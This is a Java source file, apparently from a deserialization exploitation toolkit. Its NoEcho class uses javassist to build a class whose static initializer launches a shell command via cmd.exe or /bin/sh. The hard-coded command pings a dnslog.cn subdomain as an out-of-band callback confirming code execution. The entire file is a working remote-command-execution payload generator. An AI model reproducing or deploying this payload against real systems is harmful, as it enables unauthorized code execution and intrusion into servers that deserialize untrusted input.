package com.summersec.attack.deser.echo;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;





public class NoEcho implements EchoPayload {
    @Override
    public CtClass genPayload(ClassPool pool) throws NotFoundException, CannotCompileException {
        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());
        String command = "ping 75eoht.dnslog.cn";
        clazz.makeClassInitializer().insertAfter("new ProcessBuilder(System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") ? new String[]{\"cmd.exe\", \"/c\", \"" + command + "\"} : new String[]{\"/bin/sh\", \"-c\", \"" + command + "\"}).start();");
        return clazz;
    }
}


